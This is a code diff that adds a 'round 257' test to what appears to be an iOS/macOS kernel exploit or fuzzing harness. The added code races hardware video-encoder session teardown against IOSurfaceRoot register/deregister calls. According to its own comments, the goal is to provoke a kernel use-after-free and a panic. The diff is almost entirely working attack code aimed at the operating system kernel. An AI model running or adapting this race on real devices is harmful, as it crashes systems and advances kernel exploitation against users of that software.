@@ -1635,6 +1635,76 @@ static void *p13_render_loop(void *arg) {
     return NULL;
 }
 
+/* r257: encoder invalidation race — submit frames then tear down encoder mid-flight */
+static volatile int r257_run = 0;
+static volatile int r257_panics = 0;
+static volatile int r257_cycles = 0;
+
+static void r257_cb(void *ctx, void *src, OSStatus status,
+                     VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
+    (void)ctx; (void)src; (void)status; (void)flags; (void)buf;
+}
+
+static void *r257_cycle_fn(void *arg) {
+    int tid = (int)(uintptr_t)arg;
+    int w = 192, h = 192;
+
+    while (r257_run) {
+        /* Create encoder */
+        VTCompressionSessionRef session = NULL;
+        CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+        CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+        OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+            kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
+            r257_cb, NULL, &session);
+        CFRelease(enc_spec);
+        if (st != noErr || !session) { usleep(1000); continue; }
+
+        VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+        VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+
+        st = VTCompressionSessionPrepareToEncodeFrames(session);
+        if (st != noErr) {
+            VTCompressionSessionInvalidate(session); CFRelease(session);
+            continue;
+        }
+
+        /* Submit burst of frames WITHOUT waiting for callbacks */
+        int frame_base = tid * 10000000 + r257_cycles * 100;
+        for (int i = 0; i < 8 && r257_run; i++) {
+            CVPixelBufferRef pb = NULL;
+            CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
+                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
+            CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
+            CFRelease(iosurf); CFRelease(attrs);
+            if (!pb) continue;
+
+            CVPixelBufferLockBaseAddress(pb, 0);
+            void *base = CVPixelBufferGetBaseAddress(pb);
+            if (base) memset(base, (frame_base + i) & 0xFF, w * h * 4);
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+
+            CMTime pts = CMTimeMake(frame_base + i, 30);
+            CMTime dur = CMTimeMake(1, 30);
+            VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
+            CVPixelBufferRelease(pb);
+        }
+
+        /* CRITICAL: Invalidate session immediately while encoder may be processing.
+           This tears down kernel-side encoder state including IOSurface references. */
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        __sync_fetch_and_add(&r257_cycles, 1);
+    }
+    return NULL;
+}
+
 /* r256: Metal GPU race UAF — submit GPU work referencing IOSurface, free during DMA */
 static volatile int r256_run = 0;
 static volatile int r256_submitted = 0;
@@ -20053,6 +20123,70 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 257) {
+            rlog("*** rounds=257: Encoder invalidation race UAF ***\n");
+            rlog("  Rapid create encoder → submit 8 frames → invalidate session\n");
+            rlog("  Session invalidation tears down kernel encoder state mid-flight\n");
+            rlog("  GPU/AVE may still be DMA'ing from IOSurface when kernel frees it\n\n");
+
+            char r257_sp[256];
+            { char *h = getenv("HOME"); snprintf(r257_sp, sizeof(r257_sp), "%s/Documents/uaf257_state.bin", h?h:"/tmp"); }
+            int r257_att = 0;
+            { FILE *f = fopen(r257_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0257) fread(&r257_att,4,1,f); fclose(f); } }
+            r257_att++;
+            rlog("  Attempt #%d\n", r257_att);
+            { FILE *f = fopen(r257_sp, "wb"); if (f) { uint32_t m=0xDEAD0257; fwrite(&m,4,1,f); fwrite(&r257_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            int r257_secs = 20;
+            if (argc > 3) r257_secs = atoi(argv[3]);
+            rlog("  Duration: %d seconds\n", r257_secs);
+            rlog("  >>> VERY HIGH PROBABILITY OF KERNEL PANIC <<<\n");
+            fflush(stdout);
+
+            r257_run = 1;
+            r257_cycles = 0;
+
+            /* 3 cycle threads — each rapidly creates/destroys encoder sessions */
+            pthread_t r257_thr[3];
+            for (int i = 0; i < 3; i++)
+                pthread_create(&r257_thr[i], NULL, r257_cycle_fn, (void*)(uintptr_t)i);
+
+            /* sel17/18 memory pressure */
+            io_service_t r257_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t r257_conn = IO_OBJECT_NULL;
+            if (r257_svc) IOServiceOpen(r257_svc, mach_task_self(), 0, &r257_conn);
+            pthread_t r257_t17, r257_t18;
+            if (r257_conn) {
+                g_race250_conn = r257_conn;
+                g_race250_run = 1;
+                g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+                g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+                pthread_create(&r257_t17, NULL, g_race250_sel17_fn, NULL);
+                pthread_create(&r257_t18, NULL, g_race250_sel18_fn, NULL);
+            }
+
+            for (int s = 0; s < r257_secs; s++) {
+                usleep(1000000);
+                rlog("  +%ds cycles=%d reg=%d/%d\n", s+1,
+                     r257_cycles, g_race250_reg_ok, g_race250_reg_fail);
+            }
+
+            r257_run = 0;
+            g_race250_run = 0;
+            for (int i = 0; i < 3; i++) pthread_join(r257_thr[i], NULL);
+            if (r257_conn) {
+                pthread_join(r257_t17, NULL);
+                pthread_join(r257_t18, NULL);
+                IOServiceClose(r257_conn);
+                IOObjectRelease(r257_svc);
+            }
+
+            rlog("\n  === SURVIVED encoder invalidation race! ===\n");
+            rlog("  Total cycles: %d\n", r257_cycles);
+            rlog("*** r=257 complete ***\n");
             goto done;
         }
         if (rounds == 256) {
